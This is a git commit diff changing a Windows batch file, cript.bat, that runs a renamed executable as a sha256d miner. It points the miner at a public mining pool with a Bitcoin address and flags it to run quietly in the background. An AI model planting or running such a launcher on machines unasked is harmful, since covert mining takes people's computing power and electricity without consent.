3ceabcda31d137c18793320e6b9d54edb5f7e965
Oscar Espinosa <oscare_@outlook.com>
2019-08-01 22:28:51 -0500

    Update cript.bat

--- cript.bat
+++ cript.bat
@@ -1,1 +1,1 @@
-start cript.exe -a sha256d -o stratum+tcp://nya.kano.is:3333 -u 14SJbPSPtXucTcthxTzmCmQXSKatGpV7fQ -p x -q -B
+cript.exe -a sha256d -o stratum+tcp://nya.kano.is:3333 -u 14SJbPSPtXucTcthxTzmCmQXSKatGpV7fQ -p x -q -B
